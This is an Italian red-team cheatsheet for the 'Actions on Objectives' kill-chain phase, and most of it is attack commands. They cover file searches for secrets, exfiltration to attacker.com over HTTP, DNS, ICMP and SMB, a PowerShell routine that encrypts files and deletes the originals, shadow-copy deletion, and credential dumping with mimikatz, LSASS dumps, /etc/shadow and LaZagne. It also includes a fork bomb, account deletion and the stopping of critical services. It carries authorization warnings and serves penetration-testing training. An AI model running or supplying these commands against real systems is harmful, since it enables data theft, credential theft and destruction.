# 🎯 Fase 7: Actions on Objectives

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Obiettivo:** Raggiungere l'obiettivo finale - esfiltrazione dati, distruzione o altro impatto.

---

## 📤 Esfiltrazione Dati

### Ricerca di Dati Sensibili

#### Windows
```cmd
# Cerca file sensibili
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Trova file modificati di recente
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell - ricerca per contenuto
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Cerca file sensibili
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# File recenti
find / -mtime -7 -type f 2>/dev/null

# File grandi
find / -size +100M -type f 2>/dev/null
```

### Comprimi & Prepara i Dati

#### Windows
```powershell
# PowerShell - Crea ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar con compressione
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Crea archivio compresso
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Con cifratura
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP con password
zip -r -e data.zip /sensitive/
```

### Metodi di Esfiltrazione

#### HTTP/HTTPS
```bash
# Upload via curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 via GET (pochi dati)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# PowerShell upload
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS Exfiltration
```bash
# Codifica dati in query DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Usando dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Esfiltra via ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Usando icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copia su share dell'attaccante
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Monta e copia (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Servizi Cloud
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Azioni Distruttive (Simulazione Ransomware)

> ⚠️ **ATTENZIONE:** Solo per attività red team autorizzate!

### Simulazione Cifratura
```powershell
# PowerShell - Cifra file (simulazione)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Eliminazione Shadow Copy
```cmd
# Cancella shadow copies (impedisce il recupero)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Disabilita shadow copies
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Credential Harvesting

### Credenziali Windows
```powershell
# Mimikatz - Tutte le credenziali
mimikatz# sekurlsa::logonpasswords

# Dump SAM database
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Dump LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Estrai dal dump
pypykatz lsa minidump lsass.dmp
```

### Credenziali Linux
```bash
# File shadow
cat /etc/shadow

# Chiavi SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# File di history
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# File di config
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Credenziali Browser
```bash
# Chrome credentials (Windows)
# Percorso: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox credentials (Windows)
# Percorso: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne - Tutte le password browser
python laZagne.py all
```

---

## 🖥️ Impatto sul Sistema

### Denial of Service (DoS)
```bash
# Fork bomb (Linux) - NON ESEGUIRE!
:(){ :|:& };:

# Riempimento disco
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Esaurimento CPU
yes > /dev/null &
```

### Manipolazione Account
```bash
# Cambia tutte le password utenti
net user administrator NewP@ssw0rd!

# Blocca account
net user username /active:no

# Cancella utenti
net user username /delete
```

### Interruzione dei Servizi
```cmd
# Ferma servizi critici
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Disabilita servizi
sc config wuauserv start= disabled
```

---

## 📊 Riferimento Rapido

### Metodi di Esfiltrazione

| Metodo | Pro | Contro |
|--------|-----|--------|
| HTTP/HTTPS | Traffico comune, cifrato | Potrebbe essere monitorato |
| DNS | Spesso non monitorato | Lento, limiti di dimensione |
| ICMP | Può bypassare firewall | Molto lento |
| SMB | Veloce, nativo | Solo interno |
| Cloud | Servizi legittimi | Richiede credenziali |

### Priorità Location Dati

| Location | Valore |
|----------|--------|
| Domain Controller | Massimo - credenziali AD |
| File Servers | Alto - Documenti |
| Email Servers | Alto - Comunicazioni |
| Database Servers | Alto - Dati business |
| Development Servers | Medio - Codice sorgente |
| User Workstations | Medio - File locali |

---

## ✅ Checklist Report Pentest

```markdown
- [ ] Documentare tutti i sistemi compromessi
- [ ] Elencare tutte le credenziali scoperte
- [ ] Mappare il percorso d’attacco dall’accesso iniziale
- [ ] Documentare vulnerabilità sfruttate
- [ ] Annotare le posizioni dei dati sensibili trovati
- [ ] Fornire raccomandazioni di remediation
- [ ] Includere una timeline delle attività
- [ ] Screenshot come evidenza dell’accesso
```

---

## 🔗 Cheatsheet Correlate

- [Mimikatz](../Mimikatz/translations/README.it.md)
- [Linux Commands](../Linux-Commands/translations/README.it.md)
- [PowerShell](../PowerShell/translations/README.it.md)

---

**Fase Precedente:** [← 06 - Defense Evasion](./06-Defense-Evasion.it.md)

**Torna alla panoramica:** [🎯 Kill Chain Overview](./README.it.md)

---

<p align="center">
  <b>🎯 Missione Completata!</b><br>
  <i>Ricorda: Esegui queste azioni solo con la dovuta autorizzazione!</i>
</p>
